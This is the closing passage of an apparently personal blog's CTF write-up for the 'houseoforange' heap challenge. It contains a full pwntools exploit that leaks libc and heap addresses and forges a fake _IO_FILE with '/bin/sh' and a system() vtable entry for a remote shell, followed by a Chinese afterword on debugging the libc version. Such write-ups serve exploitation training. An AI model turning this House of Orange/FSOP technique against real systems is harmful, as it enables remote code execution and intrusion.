</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># coding=utf-8</span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>from</span> <span style=color:#0e84b5;font-weight:700>pwn</span> <span style=color:#007020;font-weight:700>import</span> <span style=color:#666>*</span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>from</span> <span style=color:#0e84b5;font-weight:700>LibcSearcher</span> <span style=color:#007020;font-weight:700>import</span> <span style=color:#666>*</span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#context.log_level = &#39;debug&#39;</span>
</span></span><span style=display:flex><span>context<span style=color:#666>.</span>terminal <span style=color:#666>=</span> [<span style=color:#4070a0>&#34;tmux&#34;</span>,<span style=color:#4070a0>&#34;splitw&#34;</span>,<span style=color:#4070a0>&#34;-h&#34;</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>build</span>(size,payload):
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;choice : &#34;</span>,<span style=color:#4070a0>&#39;1&#39;</span>)
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;name :&#34;</span>,<span style=color:#007020>str</span>(size))
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendafter(<span style=color:#4070a0>&#34;Name :&#34;</span>,payload)
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;Orange:&#34;</span>,<span style=color:#4070a0>&#39;0&#39;</span>)
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;Orange:&#34;</span>,<span style=color:#4070a0>&#39;1&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>see</span>():
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;choice : &#34;</span>,<span style=color:#4070a0>&#39;2&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>upgrade</span>(size,payload):
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;choice : &#34;</span>,<span style=color:#4070a0>&#39;3&#39;</span>)
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;name :&#34;</span>,<span style=color:#007020>str</span>(size))
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendafter(<span style=color:#4070a0>&#34;Name:&#34;</span>,payload)
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;Orange:&#34;</span>,<span style=color:#4070a0>&#39;0&#39;</span>)
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;Orange:&#34;</span>,<span style=color:#4070a0>&#39;1&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#sh = process(&#34;./houseoforange&#34;)</span>
</span></span><span style=display:flex><span>sh <span style=color:#666>=</span> remote(<span style=color:#4070a0>&#34;111.200.241.244&#34;</span>,<span style=color:#40a070>53791</span>)
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#libc = ELF(&#34;/glibc/2.19/amd64/lib/libc-2.19.so&#34;)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>build(<span style=color:#40a070>0x80</span>,<span style=color:#4070a0>&#39;lalala</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>payload <span style=color:#666>=</span> <span style=color:#4070a0>&#39;a&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x80</span> <span style=color:#666>+</span> p64(<span style=color:#40a070>0</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0x21</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0x1f00000000</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0</span>)
</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(<span style=color:#40a070>0</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0xf31</span>)
</span></span><span style=display:flex><span>upgrade(<span style=color:#007020>len</span>(payload),payload)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>build(<span style=color:#40a070>0x1000</span>,<span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
</span></span><span style=display:flex><span>build(<span style=color:#40a070>0x400</span>,<span style=color:#4070a0>&#39;a&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>8</span>)
</span></span><span style=display:flex><span>see()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#39;a&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>8</span>)
</span></span><span style=display:flex><span>main_arena <span style=color:#666>=</span> u64(sh<span style=color:#666>.</span>recv(<span style=color:#40a070>6</span>) <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00\x00</span><span style=color:#4070a0>&#39;</span>) <span style=color:#666>-</span> <span style=color:#40a070>0x610</span> <span style=color:#666>-</span> <span style=color:#40a070>88</span>
</span></span><span style=display:flex><span>__malloc_hook_addr <span style=color:#666>=</span> main_arena <span style=color:#666>-</span> <span style=color:#40a070>0x20</span>
</span></span><span style=display:flex><span>libc <span style=color:#666>=</span> LibcSearcher(<span style=color:#4070a0>&#34;__malloc_hook&#34;</span>,__malloc_hook_addr)
</span></span><span style=display:flex><span>libc_base <span style=color:#666>=</span> __malloc_hook_addr <span style=color:#666>-</span> libc<span style=color:#666>.</span>dump(<span style=color:#4070a0>&#34;__malloc_hook&#34;</span>)
</span></span><span style=display:flex><span>_IO_list_all_addr <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> libc<span style=color:#666>.</span>dump(<span style=color:#4070a0>&#34;_IO_list_all&#34;</span>)
</span></span><span style=display:flex><span>system_addr <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> libc<span style=color:#666>.</span>dump(<span style=color:#4070a0>&#34;system&#34;</span>)
</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;libc_base:&#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(libc_base))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>upgrade(<span style=color:#40a070>0x10</span>,<span style=color:#4070a0>&#39;a&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x10</span>)
</span></span><span style=display:flex><span>see()
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#39;a&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x10</span>)
</span></span><span style=display:flex><span>heap_addr <span style=color:#666>=</span> u64(sh<span style=color:#666>.</span>recv(<span style=color:#40a070>6</span>)<span style=color:#666>.</span>ljust(<span style=color:#40a070>8</span>,<span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>))
</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;heap_addr&#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(heap_addr))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>vtable_addr <span style=color:#666>=</span> heap_addr
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>payload <span style=color:#666>=</span> <span style=color:#4070a0>&#39;a&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x400</span> <span style=color:#666>+</span> p64(<span style=color:#40a070>0</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0x21</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0x1f00000000</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>fake_chunk <span style=color:#666>=</span> <span style=color:#4070a0>&#39;/bin/sh</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span> <span style=color:#666>+</span> p64(<span style=color:#40a070>0x61</span>)
</span></span><span style=display:flex><span>fake_chunk <span style=color:#666>+=</span> p64(<span style=color:#40a070>0</span>) <span style=color:#666>+</span> p64(_IO_list_all_addr <span style=color:#666>-</span> <span style=color:#40a070>0x10</span>)
</span></span><span style=display:flex><span>fake_chunk <span style=color:#666>+=</span> p64(<span style=color:#40a070>0</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>1</span>) <span style=color:#60a0b0;font-style:italic>#_IO_write_base &lt; _IO_write_ptr</span>
</span></span><span style=display:flex><span>fake_chunk <span style=color:#666>=</span> fake_chunk<span style=color:#666>.</span>ljust(<span style=color:#40a070>0xc0</span>,<span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic>#bypass lots of things</span>
</span></span><span style=display:flex><span>fake_chunk <span style=color:#666>+=</span> p32(<span style=color:#40a070>0</span>) <span style=color:#60a0b0;font-style:italic>#_mode&lt;=0</span>
</span></span><span style=display:flex><span>fake_chunk <span style=color:#666>+=</span> p32(<span style=color:#40a070>0</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0</span>) <span style=color:#666>*</span> <span style=color:#40a070>2</span> <span style=color:#60a0b0;font-style:italic>#bypass _unused2</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> fake_chunk
</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(heap_addr <span style=color:#666>+</span> <span style=color:#40a070>0x510</span>) <span style=color:#60a0b0;font-style:italic>#vtable_addr</span>
</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(<span style=color:#40a070>0</span>) <span style=color:#666>*</span> <span style=color:#40a070>3</span> <span style=color:#60a0b0;font-style:italic>#bypass</span>
</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(system_addr)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#upgrade(len(payload),payload)</span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#gdb.attach(proc.pidof(sh)[0])</span>
</span></span><span style=display:flex><span>upgrade(<span style=color:#007020>len</span>(payload),payload)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;choice : &#34;</span>,<span style=color:#4070a0>&#39;1&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>interactive()
</span></span></code></pre></div><p>注：这个 exp 是打 XCTF 的靶机的，对 BUU 的靶机可能需要微调。</p><h3 id=后记>后记</h3><h4 id=如何发现-libc-错误的>如何发现 libc 错误的？</h4><p>过程曲折，由于我的虚拟机的 libc 版本是 2.27，我也只重新编译了 2.23 版本，所以我没法还原靶机环境，也就不知道 leak 出的地址应该减多少才能获得基地址，所以我就随便试了几个值凑到了低 12 位为零，这样当然是打不穿的。今天晚上实在是受不了了，又编译了一个 2.19 版本的 libc，调试了一下试试获得了正确的偏移，连靶机发现算出来的基地址低 12 位不是零，当时估计 libc 就是错的，用 LibcSearcher 一试，就打通了..</p><p>总结：不能怕麻烦，否则可能会更麻烦</p><h4 id=评价题目>评价题目</h4><p>这道题做了 1 天多，基本上都是对着各位师傅的 WP 做的（我这么菜肯定是没法独立做出来的），做完之后首先是对 FSOP 有了初步的了解，对 ptmalloc 的分配机制也有了更深刻的认识，也纠正了一些错误的认识，题目非常好，让我学到了很多新知识。</p><p>这是我写的最长的 WP 啦</p></section><div class=post-tags><nav class="nav tags"><ul class=tags><li><a href=/tags/write-up>write-up</a></li></ul></nav></div></article></main><footer><div style=display:flex><a class=soc href=https://github.com/chujDK rel=me title=GitHub><i data-feather=github></i></a>
<a class=border></a><a class=soc href=https://twitter.com/chujdk rel=me title=Twitter><i data-feather=twitter></i></a>
<a class=border></a><a class=soc href=mailto:chujj31@gmail.com rel=me title=Mail><i data-feather=mail></i></a>
<a class=border></a><a class=soc href=https://chujdk.github.io/index.xml rel=me title=Rss><i data-feather=rss></i></a>
<a class=border></a></div><div class=footer-info>2024 © chuj | Based on <a href=https://github.com/athul/archie>Archie</a> | Built with <a href=https://gohugo.io>Hugo</a> | <a href=#>Goto Top</a></div></footer><script>feather.replace()</script></div></body></html>